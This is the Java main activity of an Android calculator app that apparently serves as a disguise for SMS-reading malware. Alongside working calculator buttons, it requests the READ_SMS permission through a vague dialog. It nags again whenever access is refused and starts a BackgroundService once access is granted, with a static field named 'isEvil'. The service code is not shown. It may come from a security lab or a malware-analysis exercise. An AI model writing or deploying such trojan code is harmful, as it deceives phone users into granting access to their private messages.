package com.example.calculator;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import org.mozilla.javascript.Context;
import org.mozilla.javascript.Scriptable;

public class MainActivity extends AppCompatActivity {

    public static boolean isEvil;
    public static String version;
    public static int sessionID;
    Button btnClear, btn0, btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9, btnAdd, btnMinus, btnMultiply, btnBracket, btnPercent;
    Button btnDivision, btnDot, btnEquals;
    TextView tvInput, tvOutput;
    String process;
    Boolean checkBracket = false;
    static final int PERMISSION_REQUEST_READ_SMS = 101;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        btn0 = findViewById(R.id.btn0);
        btn1 = findViewById(R.id.btn1);
        btn2 = findViewById(R.id.btn2);
        btn3 = findViewById(R.id.btn3);
        btn4 = findViewById(R.id.btn4);
        btn5 = findViewById(R.id.btn5);
        btn6 = findViewById(R.id.btn6);
        btn7 = findViewById(R.id.btn7);
        btn8 = findViewById(R.id.btn8);
        btn9 = findViewById(R.id.btn9);
        btnClear = findViewById(R.id.btnClear);
        btnAdd = findViewById(R.id.btnAdd);
        btnBracket = findViewById(R.id.btnBracket);
        btnMinus = findViewById(R.id.btnMinus);
        btnMultiply = findViewById(R.id.btnMultiply);
        btnPercent = findViewById(R.id.btnPercent);
        btnDivision = findViewById(R.id.btnDivision);
        btnDot = findViewById(R.id.btnDot);
        btnEquals = findViewById(R.id.btnEquals);

        tvInput = findViewById(R.id.tvInput);
        tvOutput = findViewById(R.id.tvOutput);

        btnClear.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                tvInput.setText("");
                tvOutput.setText("");
            }
        });

        btn0.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                process = tvInput.getText().toString();
                tvInput.setText(process + "0");
            }
        });

        btn1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                process = tvInput.getText().toString();
                tvInput.setText(process + "1");
            }
        });

        btn2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                process = tvInput.getText().toString();
                tvInput.setText(process + "2");
            }
        });

        btn3.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                process = tvInput.getText().toString();
                tvInput.setText(process + "3");
            }
        });

        btn4.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                process = tvInput.getText().toString();
                tvInput.setText(process + "4");
            }
        });

        btn5.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                process = tvInput.getText().toString();
                tvInput.setText(process + "5");
            }
        });

        btn6.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                process = tvInput.getText().toString();
                tvInput.setText(process + "6");
            }
        });

        btn7.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                process = tvInput.getText().toString();
                tvInput.setText(process + "7");
            }
        });

        btn8.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                process = tvInput.getText().toString();
                tvInput.setText(process + "8");
            }
        });

        btn9.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                process = tvInput.getText().toString();
                tvInput.setText(process + "9");
            }
        });

        btnAdd.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                process = tvInput.getText().toString();
                tvInput.setText(process + "+");
            }
        });

        btnMinus.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                process = tvInput.getText().toString();
                tvInput.setText(process + "-");
            }
        });

        btnMultiply.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                process = tvInput.getText().toString();
                tvInput.setText(process + "×");
            }
        });

        btnDivision.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                process = tvInput.getText().toString();
                tvInput.setText(process + "÷");
            }
        });

        btnDot.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                process = tvInput.getText().toString();
                tvInput.setText(process + ".");
            }
        });

        btnPercent.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                process = tvInput.getText().toString();
                tvInput.setText(process + "%");
            }
        });

        btnEquals.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                process = tvInput.getText().toString();

                process = process.replaceAll("×", "*");
                process = process.replaceAll("%",  "/100");
                process = process.replaceAll("÷","/");

                Context rhino = Context.enter();
                rhino.setOptimizationLevel(-1);

                String finalResult = "";

                try {
                    Scriptable scriptable = rhino.initStandardObjects();
                    finalResult = rhino.evaluateString(scriptable, process, "javascript", 1, null).toString();
                } catch (Exception e) {
                    finalResult = "0";
                }
                tvOutput.setText(finalResult);
            }
        });

        btnBracket.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (checkBracket) {
                    process = tvInput.getText().toString();
                    tvInput.setText(process + ")");
                    checkBracket = false;
                } else {
                    process = tvInput.getText().toString();
                    tvInput.setText(process + "(");
                    checkBracket = true;
                }
            }
        });

        getPermission();
    }

    void getPermission() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {

            // Should we show an explanation?
            AlertDialog.Builder builder = new AlertDialog.Builder(this);
            builder.setTitle("SMS access needed");
            builder.setPositiveButton(android.R.string.ok, null);
            builder.setMessage("Please confirm SMS access"); // TODO put real question
            builder.setOnDismissListener(new DialogInterface.OnDismissListener() {
                @Override
                public void onDismiss(DialogInterface dialog) {
                    ActivityCompat.requestPermissions(
                            MainActivity.this,
                            new String[]{Manifest.permission.READ_SMS},
                            PERMISSION_REQUEST_READ_SMS
                    );
                }
            });
            builder.show();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_READ_SMS) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Log.d("Main","Permission Granted");

                Intent serviceIntent = new Intent(this, BackgroundService.class);
                startService(serviceIntent);
                Log.d("Main","Starting the background service");

            } else {
                Log.d("Main","Permission not granted");
                getPermission();
            }
        }
    }
}
